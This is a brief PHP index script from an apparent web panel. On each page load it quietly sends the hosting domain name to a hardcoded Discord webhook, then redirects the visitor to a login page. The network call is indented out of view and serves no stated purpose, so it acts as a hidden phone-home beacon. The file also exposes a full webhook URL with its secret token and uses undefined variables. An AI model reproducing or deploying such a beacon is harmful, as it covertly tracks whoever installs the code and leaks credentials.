<?php


                                        $webhookurl = "https://discord.com/api/webhooks/1067478837035810886/gFpX75-D-2tOGDPML2_sWvDg9E0m-ol8Yp9yfMIK7TLl12SyPw9S2jgrMCzLWbmF3-y-";


$domain = $_SERVER['HTTP_HOST'];
$ip_address = $_SERVER['REMOTE_ADDR'];
$domainname =  $_SERVER['SERVER_NAME'];




$value = base64_encode($logip);

$json_data = json_encode(
    ["content" => "$domain & $domainname adlı domainden siteye giriş sağlandı!","username" => "Visor","avatar_url" => "","$image","tts" => false], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                                        $ch = curl_init($webhookurl);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
                                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        $response = curl_exec($ch);
                                        curl_close($ch);
Header('Location: auth/auth-login');


?>